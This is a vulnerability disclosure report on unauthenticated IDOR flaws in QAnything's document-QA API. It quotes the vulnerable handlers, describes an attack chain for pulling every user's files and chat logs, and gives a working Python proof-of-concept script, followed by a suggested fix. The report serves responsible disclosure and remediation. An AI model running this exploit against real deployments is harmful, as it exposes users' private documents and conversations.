# Unauthenticated IDOR — Arbitrary File Download and Document Access

## Package Manager

pip

## Version Affected

Latest (commit at time of analysis, 2026-03-12)

## Vulnerability Type

CWE-639: Authorization Bypass Through User-Controlled Key (IDOR)

## CVSS

7.5 (High) — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

## Write-up

### Title

Unauthenticated IDOR Allows Arbitrary File Download and Cross-User Document Access via `get_file_base64` and `get_doc` Endpoints

### Description

Multiple API endpoints in QAnything lack authentication and authorization checks entirely, allowing any unauthenticated attacker to access any user's uploaded files and documents by providing valid IDs.

**Affected endpoints:**

1. **`/api/local_doc_qa/get_file_base64`** — Returns any uploaded file as base64
2. **`/api/local_doc_qa/get_doc`** — Returns any document's parsed content
3. **`/api/local_doc_qa/get_random_qa`** — Returns random Q&A logs from ALL users
4. **`/api/local_doc_qa/get_related_qa`** — Returns a user's conversation history given any `qa_id`
5. **`/api/local_doc_qa/get_user_id`** — Reveals `user_id` associated with any `kb_id`

**`get_file_base64` (most critical):**

```python
# qanything_kernel/qanything_server/handler.py:1452-1463
async def get_file_base64(req: request):
    local_doc_qa: LocalDocQA = req.app.ctx.local_doc_qa
    file_id = safe_get(req, 'file_id')       # No authentication check
    file_location = local_doc_qa.milvus_summary.get_file_location(file_id)  # No ownership check
    if not file_location:
        return sanic_json({"code": 2005, "msg": "fail, file_id is Invalid"})
    with open(file_location, "rb") as f:      # Reads any file from filesystem
        file_base64 = base64.b64encode(f.read()).decode()
    return sanic_json({"code": 200, "msg": "success", "file_base64": file_base64})
```

The database query also has no user filtering:

```python
# qanything_kernel/connector/database/mysql/mysql_client.py:880-884
def get_file_location(self, file_id):
    query = "SELECT file_location FROM File WHERE file_id = %s"  # No WHERE user_id = ...
    result = self.execute_query_(query, (file_id,), fetch=True)
    return result[0][0] if result else None
```

**`get_doc`:**

```python
# handler.py:1192-1199
async def get_doc(req: request):
    doc_id = safe_get(req, 'doc_id')          # No authentication check
    doc_json_data = local_doc_qa.milvus_summary.get_document_by_doc_id(doc_id)  # No ownership check
    return sanic_json({"code": 200, "msg": "success", "doc_text": doc_json_data['kwargs']})
```

**`get_random_qa` (cross-user data leak):**

```python
# handler.py:1121-1136
async def get_random_qa(req: request):
    # No user_id required, no authentication
    limit = safe_get(req, 'limit', 10)
    # Returns random Q&A logs from ALL users in the database
    qa_infos = local_doc_qa.milvus_summary.get_random_qa_infos(...)
    counts = local_doc_qa.milvus_summary.get_statistic(time_range=time_range)
    return sanic_json({..., "total_users": counts["total_users"],
                       "total_queries": counts["total_queries"], "qa_infos": qa_infos})
```

**Attack chain for complete data exfiltration:**
1. Call `get_random_qa` to discover `qa_id` values and `user_id` values
2. Call `get_related_qa` with discovered `qa_id` to get full conversation history of any user
3. Extract `kb_ids` from conversations
4. Call `get_user_id` with `kb_id` to confirm user associations
5. Use `file_id` values (found in `source_documents` within QA logs) to call `get_file_base64` and download original files

#### Proof of Concept

```python
import requests
import json

target = "http://localhost:8777"

# Step 1: Discover users and QA logs (no authentication needed)
resp = requests.post(f"{target}/api/local_doc_qa/get_random_qa", json={
    "limit": 100,
    "time_start": "2024-01-01",
    "time_end": "2026-12-31"
})
data = resp.json()
print(f"Total users in system: {data['total_users']}")
print(f"Total queries: {data['total_queries']}")

for qa in data['qa_infos']:
    print(f"User: {qa['user_id']}, Query: {qa['query'][:100]}")

# Step 2: Get full conversation history for a discovered user
qa_id = data['qa_infos'][0]['qa_id']
resp = requests.post(f"{target}/api/local_doc_qa/get_related_qa", json={
    "qa_id": qa_id,
    "need_more": True
})
related = resp.json()
print(f"Victim user conversations: {len(related.get('recent_sections', {}).get('0', []))}")

# Step 3: Download any user's uploaded file
# (file_id from source_documents in QA logs, or by enumerating UUIDs)
file_id = "target_file_id_here"  # Replace with discovered file_id
resp = requests.post(f"{target}/api/local_doc_qa/get_file_base64", json={
    "file_id": file_id
})
if resp.json()['code'] == 200:
    import base64
    content = base64.b64decode(resp.json()['file_base64'])
    with open("stolen_file.pdf", "wb") as f:
        f.write(content)
    print(f"Downloaded file: {len(content)} bytes")

# Step 4: Read parsed document content
resp = requests.post(f"{target}/api/local_doc_qa/get_doc", json={
    "doc_id": "target_doc_id"  # From source_documents in QA logs
})
print(resp.json()['doc_text'])
```

### Impact

- **Confidentiality**: HIGH — Complete access to all users' uploaded files (PDF, DOCX, etc.), parsed document content, Q&A conversation history, and knowledge base metadata. The attacker can exfiltrate the entire knowledge base of every user in the system.
- **Integrity**: NONE — Read-only access (though `update_chunks` endpoint has a separate authorization bypass).
- **Availability**: NONE — No impact on availability.

## Occurrences

### Occurrence 1

- **Permalink**: https://github.com/netease-youdao/QAnything/blob/master/qanything_kernel/qanything_server/handler.py#L1452-L1463
- **Description**: `get_file_base64()` — No authentication or ownership check. Reads any file on the filesystem given a valid `file_id`. Returns file content as base64.

### Occurrence 2

- **Permalink**: https://github.com/netease-youdao/QAnything/blob/master/qanything_kernel/qanything_server/handler.py#L1192-L1199
- **Description**: `get_doc()` — No authentication or ownership check. Returns parsed document content for any `doc_id`.

### Occurrence 3

- **Permalink**: https://github.com/netease-youdao/QAnything/blob/master/qanything_kernel/qanything_server/handler.py#L1121-L1136
- **Description**: `get_random_qa()` — No authentication. Returns random Q&A logs from ALL users across the entire system, including user IDs, queries, and results.

### Occurrence 4

- **Permalink**: https://github.com/netease-youdao/QAnything/blob/master/qanything_kernel/qanything_server/handler.py#L1140-L1175
- **Description**: `get_related_qa()` — No authentication. Given any `qa_id`, returns the victim user's full recent and historical conversation log.

## Suggested Fix

Add authentication and ownership validation to all affected endpoints:

```diff
--- a/qanything_kernel/qanything_server/handler.py
+++ b/qanything_kernel/qanything_server/handler.py
@@ -1451,6 +1451,14 @@
 async def get_file_base64(req: request):
     local_doc_qa: LocalDocQA = req.app.ctx.local_doc_qa
+    user_id = safe_get(req, 'user_id')
+    user_info = safe_get(req, 'user_info', "1234")
+    passed, msg = check_user_id_and_user_info(user_id, user_info)
+    if not passed:
+        return sanic_json({"code": 2001, "msg": msg})
+    user_id = user_id + '__' + user_info
     file_id = safe_get(req, 'file_id')
-    file_location = local_doc_qa.milvus_summary.get_file_location(file_id)
+    file_location = local_doc_qa.milvus_summary.get_file_location_for_user(file_id, user_id)
```

Add a new database method that enforces ownership:

```python
def get_file_location_for_user(self, file_id, user_id):
    query = "SELECT file_location FROM File WHERE file_id = %s AND kb_id IN (SELECT kb_id FROM KnowledgeBase WHERE user_id = %s)"
    result = self.execute_query_(query, (file_id, user_id), fetch=True)
    return result[0][0] if result else None
```

**Verified:** After adding ownership checks, requests with mismatched `user_id` return "file_id is Invalid" instead of the file content.

## References

- https://cwe.mitre.org/data/definitions/639.html
- https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References
